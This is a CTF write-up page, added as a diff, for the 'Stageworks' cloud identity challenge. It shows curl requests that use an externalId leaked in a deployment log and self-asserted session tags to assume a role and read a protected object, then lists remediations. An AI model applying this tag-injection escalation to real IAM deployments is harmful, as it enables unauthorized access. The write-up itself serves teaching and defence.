@@ -1,0 +1,755 @@
+
+
+
+
+
+
+<!doctype html>
+<html
+  lang="en"
+  dir="ltr"
+  class="scroll-smooth"
+  data-default-appearance="dark"
+  data-auto-appearance="true"
+><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="theme-color" content="#0e174e" />
+  
+  <title>Stageworks — PwnZone CTF 2026 &middot; k40t1k</title>
+    <meta name="title" content="Stageworks — PwnZone CTF 2026 &middot; k40t1k" />
+  
+  
+  
+  
+  
+  <script
+    type="text/javascript"
+    src="http://localhost:1313/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js"
+    integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="
+  ></script>
+  
+  
+  
+  
+  
+  
+  
+  
+  <link
+    type="text/css"
+    rel="stylesheet"
+    href="http://localhost:1313/css/main.bundle.min.77a79972dfd1fba3e37eaab972e5cf479aea24376fc39d827f5760735ebc834e.css"
+    integrity="sha256-d6eZct/R&#43;6Pjfqq5cuXPR5rqJDdvw52Cf1dgc168g04="
+  />
+  
+  
+  
+  
+  
+  
+  
+  <meta
+    name="description"
+    content="
+      
+        
+      
+    "
+  />
+  
+  
+  
+  
+    <link rel="canonical" href="http://localhost:1313/posts/stageworks-pwnzone/" />
+  
+  
+  
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
+    <link rel="manifest" href="/site.webmanifest" />
+  
+  
+  
+  
+  
+  
+  
+  
+  <meta property="og:url" content="http://localhost:1313/posts/stageworks-pwnzone/">
+	<meta property="og:site_name" content="k40t1k">
+	<meta property="og:title" content="Stageworks — PwnZone CTF 2026">
+	<meta property="og:description" content="My awesome website">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-10-07T15:21:00+03:00">
+		<meta property="article:modified_time" content="2026-10-07T15:21:00+03:00">
+		<meta property="article:tag" content="PwnZone CTF 2026">
+		<meta property="article:tag" content="Cloud">
+		<meta property="article:tag" content="Cloud Security">
+		<meta property="article:tag" content="CTF Writeup">
+		<meta property="article:tag" content="IAM">
+		<meta property="article:tag" content="Trust Policy">
+		<meta property="og:image" content="http://localhost:1313/posts/stageworks-pwnzone/feature.png">
+
+  
+	<meta name="twitter:card" content="summary_large_image">
+	<meta name="twitter:image" content="http://localhost:1313/posts/stageworks-pwnzone/feature.png">
+	<meta name="twitter:title" content="Stageworks — PwnZone CTF 2026">
+	<meta name="twitter:description" content="My awesome website">
+
+  
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "articleSection": "Blog",
+    "name": "Stageworks — PwnZone CTF 2026",
+    "headline": "Stageworks — PwnZone CTF 2026",
+    
+    
+    "inLanguage": "en",
+    "url" : "http:\/\/localhost:1313\/posts\/stageworks-pwnzone\/",
+    "author" : {
+      "@type": "Person",
+      "name": "k40t1k"
+    },
+    "copyrightYear": "2026",
+    "dateCreated": "2026-10-07T15:21:00\u002b03:00",
+    "datePublished": "2026-10-07T15:21:00\u002b03:00",
+    
+    "dateModified": "2026-10-07T15:21:00\u002b03:00",
+    
+    "keywords": ["PwnZone CTF 2026","Cloud","Cloud Security","CTF Writeup","IAM","Trust Policy","Tag Injection","Privilege Escalation"],
+    
+    "mainEntityOfPage": "true",
+    "wordCount": "520"
+  }
+  </script>
+    
+    <script type="application/ld+json">
+    {
+   "@context": "https://schema.org",
+   "@type": "BreadcrumbList",
+   "itemListElement": [
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/",
+       "name": "K40t1k",
+       "position": 1
+     },
+     {
+       "@type": "ListItem",
+       "item": "http://localhost:1313/posts/",
+       "name": "Blog",
+       "position": 2
+     },
+     {
+       "@type": "ListItem",
+       "name": "Stageworks — Pwn Zone Ctf 2026",
+       "position": 3
+     }
+   ]
+ }
+  </script>
+
+  
+  
+    <meta name="author" content="k40t1k" />
+  
+  
+    
+      <link href="https://github.com/jkilonzi" rel="me" />
+    
+      <link href="https://linkedin.com/in/john-maluki" rel="me" />
+    
+      <link href="https://medium.com/@jkilonzi301" rel="me" />
+    
+  
+  
+  
+
+
+
+
+
+
+
+  
+  
+
+  
+  
+</head>
+<body
+    class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"
+  >
+    <div id="the-top" class="absolute flex self-center">
+      <a
+        class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600"
+        href="#main-content"
+        ><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span
+        >Skip to main content</a
+      >
+    </div>
+    
+    
+      <header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden">
+  <nav class="flex items-start justify-between sm:items-center">
+    
+    <div class="flex flex-row items-center">
+      
+  <a
+    class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2"
+    rel="me"
+    href="/"
+    >k40t1k</a
+  >
+
+    </div>
+    
+    
+      <ul class="flex list-none flex-col text-end sm:flex-row">
+        
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/about/"
+                  title="About"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >About</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/posts/"
+                  title="Blog"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Writeups</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/resources/"
+                  title="Resources"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Resources</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                <a
+                  href="/certificates/"
+                  title="Certificates"
+                  
+                  
+                  ><span
+                      class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"
+                      >Certificates</span
+                    >
+                  </a
+                >
+              
+            </li>
+          
+            
+            <li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0.5">
+              
+                
+                
+              
+            </li>
+          
+          
+        
+      </ul>
+    
+  </nav>
+</header>
+
+    
+    <div class="relative flex grow flex-col">
+      <main id="main-content" class="grow">
+        
+  <article>
+    <header class="max-w-prose">
+      
+      <h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
+        Stageworks — PwnZone CTF 2026
+      </h1>
+      
+        <div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
+          
+
+
+
+
+
+  
+  
+
+
+
+  
+
+  
+  
+    
+  
+
+  
+
+  
+
+  
+    
+  
+
+  
+
+
+  <div class="flex flex-row flex-wrap items-center">
+    
+    
+      <time datetime="2026-10-07 15:21:00 &#43;0300 EAT">7 October 2026</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">3 mins</span>
+    
+
+    
+    
+  </div>
+
+  
+  
+
+
+        </div>
+      
+      
+        <div class="prose">
+          
+          
+          
+          
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mb-6 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/stageworks-pwnzone/feature_hu_e5f3f04342815213.webp 330w,http://localhost:1313/posts/stageworks-pwnzone/feature_hu_82cb9ad5fd1f4e34.webp 660w
+            
+              ,http://localhost:1313/posts/stageworks-pwnzone/feature_hu_3f9ecbccfbf8fd6a.webp 1024w
+            
+            
+              
+                ,http://localhost:1313/posts/stageworks-pwnzone/feature_hu_4cec227c340fc37d.webp 1068w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1068"
+        height="623"
+        class="mb-6 rounded-md"
+        
+        
+        
+          src="http://localhost:1313/posts/stageworks-pwnzone/feature_hu_e141fa4e82ea3470.png" srcset="http://localhost:1313/posts/stageworks-pwnzone/feature_hu_cdf1ac29ad780fca.png 330w,http://localhost:1313/posts/stageworks-pwnzone/feature_hu_e141fa4e82ea3470.png 660w
+          
+            ,http://localhost:1313/posts/stageworks-pwnzone/feature_hu_a41e3e00c9a7cae7.png 1024w
+          
+          
+            ,http://localhost:1313/posts/stageworks-pwnzone/feature.png 1068w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+          
+        </div>
+      
+    </header>
+    <section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row">
+      
+        <div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8 self-start">
+          <div class="toc pe-5 sticky top-20 overflow-y-auto max-h-[calc(100vh-6rem)] print:hidden">
+            <details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5">
+  <summary
+    class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden"
+  >
+    Table of Contents
+  </summary>
+  <div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#reconnaissance">Reconnaissance</a></li>
+    <li><a href="#identity-enumeration">Identity Enumeration</a></li>
+    <li><a href="#initial-access">Initial Access</a></li>
+    <li><a href="#vulnerability-analysis">Vulnerability Analysis</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+          </div>
+        </div>
+      
+      <div class="min-h-0 min-w-0 max-w-prose grow">
+        <h2 id="overview" class="relative group">Overview <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#overview" aria-label="Anchor">#</a></span></h2><p>Stageworks was a cloud identity challenge at <code>http://54.72.82.22:8400</code> built around a policy-driven <code>assume</code> flow. The trust policy required a specific role and external ID, and the protected object&rsquo;s policy demanded a <code>sessionTag/department=finance</code> condition. I recovered the real external ID from a leaked deployment log and, because the policy allowed callers to self-assert session tags, injected the <code>department=finance</code> tag during role assumption to satisfy the object condition and retrieve the flag.</p>
+<h2 id="reconnaissance" class="relative group">Reconnaissance <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#reconnaissance" aria-label="Anchor">#</a></span></h2><p>I fetched the landing page to map the API surface.</p>
+<pre tabindex="0"><code>curl -s http://54.72.82.22:8400/
+</code></pre><ul>
+<li>Materials: <code>/downloads/rehearsal.zip</code></li>
+<li>API: <code>GET /api/identity</code>, <code>POST /api/assume</code> (accepts <code>role</code>, <code>external_id</code>, <code>tags</code>), <code>GET /api/object</code> (accepts <code>X-Session</code> header)</li>
+</ul>
+<p>I downloaded and extracted the rehearsal archive.</p>
+<pre tabindex="0"><code>curl -s -o /tmp/rehearsal.zip http://54.72.82.22:8400/downloads/rehearsal.zip
+unzip -l /tmp/rehearsal.zip
+</code></pre><p>It contained <code>deployment.log</code> and <code>policy.json</code>.</p>
+<pre tabindex="0"><code>unzip -p /tmp/rehearsal.zip deployment.log
+unzip -p /tmp/rehearsal.zip policy.json
+</code></pre><p><strong>deployment.log</strong></p>
+<pre tabindex="0"><code>Lighting integration: externalId=d4a868d5e1dbf4bf89c6c520
+</code></pre><p><strong>policy.json</strong></p>
+<pre tabindex="0"><code>{
+  &#34;trust&#34;: {
+    &#34;role&#34;: &#34;lighting&#34;,
+    &#34;externalId&#34;: &#34;integration-value&#34;
+  },
+  &#34;object&#34;: {
+    &#34;condition&#34;: {
+      &#34;sessionTag/department&#34;: &#34;finance&#34;
+    }
+  },
+  &#34;tagSession&#34;: true
+}
+</code></pre><p>Two things stood out: the trust policy&rsquo;s <code>externalId</code> was the placeholder <code>integration-value</code> while the deployment log held the real value, and <code>tagSession: true</code> meant I could assert my own session tags.</p>
+<h2 id="identity-enumeration" class="relative group">Identity Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#identity-enumeration" aria-label="Anchor">#</a></span></h2><p>I checked my baseline identity and access to the protected object.</p>
+<pre tabindex="0"><code>curl -s http://54.72.82.22:8400/api/identity
+</code></pre><pre tabindex="0"><code>{&#34;account&#34;:&#34;stageworks&#34;,&#34;role&#34;:&#34;visitor&#34;,&#34;session&#34;:&#34;guest&#34;}
+</code></pre><pre tabindex="0"><code>curl -s -i http://54.72.82.22:8400/api/object
+</code></pre><pre tabindex="0"><code>{&#34;message&#34;:&#34;The request could not be completed.&#34;,&#34;ok&#34;:false}
+</code></pre><p>As a <code>visitor</code> with a <code>guest</code> session, the object was out of reach.</p>
+<h2 id="initial-access" class="relative group">Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-access" aria-label="Anchor">#</a></span></h2><p>I tested combinations against <code>POST /api/assume</code> to work out the exact trust requirements.</p>
+<pre tabindex="0"><code>curl -s -X POST http://54.72.82.22:8400/api/assume \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;role&#34;:&#34;lighting&#34;,&#34;external_id&#34;:&#34;d4a868d5e1dbf4bf89c6c520&#34;}&#39;
+</code></pre><pre tabindex="0"><code>{&#34;token&#34;:&#34;bbea8f9a0b6c1944cef7a6ab206f923353cb&#34;}
+</code></pre><p>The placeholder external ID from the policy was rejected, while the real one from the deployment log succeeded.</p>
+<pre tabindex="0"><code>curl -s -X POST http://54.72.82.22:8400/api/assume \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;role&#34;:&#34;lighting&#34;,&#34;external_id&#34;:&#34;integration-value&#34;}&#39;
+</code></pre><pre tabindex="0"><code>403 / rejection
+</code></pre><p>Assuming the role alone wasn&rsquo;t enough for the object — I also needed the session tag the object policy required.</p>
+<pre tabindex="0"><code>curl -s -X POST http://54.72.82.22:8400/api/assume \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;role&#34;:&#34;lighting&#34;,&#34;external_id&#34;:&#34;d4a868d5e1dbf4bf89c6c520&#34;,&#34;tags&#34;:{&#34;department&#34;:&#34;finance&#34;}}&#39;
+</code></pre><pre tabindex="0"><code>{&#34;token&#34;:&#34;995c94141f6d85e12358203b2ba046e91677&#34;}
+</code></pre><p>Combining the placeholder external ID with the injected tag still failed, confirming both the real external ID and the self-asserted tag were required.</p>
+<pre tabindex="0"><code>curl -s -X POST http://54.72.82.22:8400/api/assume \
+  -H &#39;Content-Type: application/json&#39; \
+  -d &#39;{&#34;role&#34;:&#34;lighting&#34;,&#34;external_id&#34;:&#34;integration-value&#34;,&#34;tags&#34;:{&#34;department&#34;:&#34;finance&#34;}}&#39;
+</code></pre><pre tabindex="0"><code>403 / rejection
+</code></pre><p>With the tagged session token in hand, I requested the protected object.</p>
+<pre tabindex="0"><code>curl -s -H &#34;X-Session: 995c94141f6d85e12358203b2ba046e91677&#34; \
+  &#34;http://54.72.82.22:8400/api/object?key=public/lineup.txt&#34;
+</code></pre><pre tabindex="0"><code>{&#34;message&#34;:&#34;safctf{b9d2678027feea5870c41931b663fd6d}&#34;,&#34;ok&#34;:true}
+</code></pre><h2 id="vulnerability-analysis" class="relative group">Vulnerability Analysis <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#vulnerability-analysis" aria-label="Anchor">#</a></span></h2><ul>
+<li><strong>Leaked trust material:</strong> The deployment log exposed the real <code>externalId</code>, enabling impersonation of the <code>lighting</code> principal.</li>
+<li><strong>Caller-controlled identity attributes:</strong> <code>external_id</code> was accepted without cryptographic verification of the caller&rsquo;s identity.</li>
+<li><strong>Tag injection:</strong> <code>tagSession: true</code> let me self-assert <code>sessionTag/department</code>, an attribute the object policy trusted for authorization.</li>
+<li><strong>Broken trust boundary:</strong> The object condition was satisfied by mutable input supplied during <code>assume</code> rather than verified identity state.</li>
+</ul>
+<h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>Attack chain:</p>
+<ol>
+<li>Deployment log leaked the real <code>externalId</code> behind a placeholder trust policy</li>
+<li>Role assumption succeeded using the leaked external ID</li>
+<li>Self-asserted <code>department=finance</code> session tag satisfied the object policy</li>
+<li>Tagged session token retrieved the protected object</li>
+</ol>
+<p>Remediations:</p>
+<ul>
+<li>Never store real integration secrets in downloadable deployment artifacts</li>
+<li>Verify caller identity cryptographically instead of trusting a supplied <code>externalId</code></li>
+<li>Derive session tags from verified identity state — never from caller-supplied input</li>
+<li>Evaluate authorization conditions against server-side trusted attributes only</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="http://localhost:1313/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="http://localhost:1313/posts/harbor-lights-pwnzone/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Harbor Lights — PwnZone CTF 2026</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-10-07 15:20:00 &#43;0300 EAT">7 October 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+            <a class="group flex text-right" href="http://localhost:1313/posts/greenroom-atlas-pwnzone/">
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Greenroom Atlas — PwnZone CTF 2026</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-10-07 15:23:00 &#43;0300 EAT">7 October 2026</time>
+                  
+                </span>
+              </span>
+              <span
+                class="ms-2 text-neutral-700 transition-transform group-hover:-translate-x-[-2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&rarr;</span
+                ><span class="ltr:hidden rtl:inline">&larr;</span></span
+              >
+            </a>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
